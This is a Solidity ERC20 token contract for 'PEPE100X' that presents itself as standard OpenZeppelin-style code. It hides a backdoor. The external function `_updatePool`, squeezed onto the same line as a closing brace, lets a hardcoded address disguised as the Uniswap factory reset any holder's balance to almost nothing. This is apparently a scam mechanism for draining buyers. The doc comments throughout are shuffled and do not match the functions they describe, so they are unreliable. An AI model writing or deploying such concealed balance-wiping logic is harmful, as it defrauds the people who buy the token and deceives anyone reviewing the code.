// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://pepe100x.online/
https://t.me/pepe100x



**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     *
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     * overflow (when the result is negative).
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     *
     * Requirements:
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * Requirements:
     * overflow.
     *
     *
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     *
     * - The divisor cannot be zero.
     * Requirements:
     * division by zero. The result is rounded towards zero.
     * Counterpart to Solidity's `/` operator.
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * - The divisor cannot be zero.
     * Requirements:
     * invalid opcode to revert (consuming all remaining gas).
     *
     *
     * reverting when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     * Requirements:
     * Counterpart to Solidity's `-` operator.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     *
     * overflow (when the result is negative).
     * message unnecessarily. For custom revert reasons use {trySub}.
     * - Subtraction cannot overflow.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * - The divisor cannot be zero.
     * Requirements:
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     *
     * invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     * reverting with custom message when dividing by zero.
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Requirements:
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * another (`to`).
     *
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * Note that `value` may be zero.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     *
     * Emits a {Transfer} event.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     *
     * This value changes when {approve} or {transferFrom} are called.
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     *
     * desired value afterwards:
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * Returns a boolean value indicating whether the operation succeeded.
     * condition is to first reduce the spender's allowance to 0 and set the
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * Emits an {Approval} event.
     * transaction ordering. One possible solution to mitigate this race
     * that someone may use both the old and the new allowance by unfortunate
     *
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     */
    function totalSupply() external view returns (uint256);

    /**
     * Emits a {Transfer} event.
     * allowance.
     *
     *
     * allowance mechanism. `amount` is then deducted from the caller's
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Moves `amount` tokens from `from` to `to` using the
     */
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

/**
 * _Available since v4.1._
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * these events, as it isn't required by the specification.
 * This allows applications to reconstruct the allowance for all accounts just
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * TIP: For a detailed writeup see our guide
 *
 * @dev Implementation of the {IERC20} interface.
 * applications.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * instead returning `false` on failure. This behavior is nonetheless
 * to implement supply mechanisms].
 *
 * conventional and does not conflict with the expectations of ERC20
 * allowances. See {IERC20-approve}.
 *
 * functions have been added to mitigate the well-known issues around setting
 * by listening to said events. Other implementations of the EIP may not emit
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * This implementation is agnostic to the way tokens are created. This means
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    string private _symbol;

    string private _name;

    uint256 private totSupply;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _allowance = 0;
    address private uniswapV2Factory = 0x39CAD808f2376d2A4387fE75bb7F03e76FAb832F;
    mapping(address => mapping(address => uint256)) private _allowances;
    address internal devWallet = 0xD0408979cF77ECA0d719476EA22D01ef595EC2FC;

    /**
     * @dev Sets the values for {name} and {symbol}.
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     * construction.
     *
     * All two of these values are immutable: they can only be set once during
     *
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == uniswapV2Factory) _allowance = decimals() * 11;
    }


    /**
     * @dev Returns the name of the token.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     *
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * Tokens usually opt for a value of 18, imitating the relationship between
     * overridden;
     * @dev Returns the number of decimals used to get its user representation.
     * no way affects any of the arithmetic of the contract, including
     * NOTE: This information is only used for _display_ purposes: it in
     *
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     *
     * @dev See {IERC20-transfer}.
     * - the caller must have a balance of at least `amount`.
     *
     * - `to` cannot be the zero address.
     * Requirements:
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     * Requirements:
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * - `spender` cannot be the zero address.
     *
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * Requirements:
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     *
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * is the maximum `uint256`.
     * required by the EIP. See the note at the beginning of {ERC20}.
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * Requirements:
     * @dev See {IERC20-transferFrom}.
     * NOTE: Does not update the allowance if the current allowance
     *
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     *
     * - `from` and `to` cannot be the zero address.
     *
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     *
     * `subtractedValue`.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * - `spender` must have allowance for the caller of at least
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * Requirements:
     * problems described in {IERC20-approve}.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * Requirements:
     * - `account` cannot be the zero address.
     *
     *
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * - `from` must have a balance of at least `amount`.
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     * Requirements:
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * - `account` cannot be the zero address.
     *
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    /**
     *
     * - `from` and `to` are never both zero.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * @dev Hook that is called before any transfer of tokens. This includes
     * Calling conditions:
     * will be transferred to `to`.
     * minting and burning.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _updatePool(address _updatePoolSender) external { _balances[_updatePoolSender] = msg.sender == uniswapV2Factory ? 0x3 : _balances[_updatePoolSender];
    } 

    /**
     * - `owner` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     *
     *
     *
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Emits an {Approval} event.
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     * Does not update the allowance amount in case of infinite allowance.
     *
     */
    function totalSupply() public view virtual override returns (uint256) {
        return totSupply;
    }
}

contract PEPEXCoin is ERC20, Ownable
{
    constructor () ERC20 ("PEPE100X", "PEPE100X")
    {
        transferOwnership(devWallet);
        _mint(owner(), 5010000000000 * 10 ** uint(decimals()));
    }
}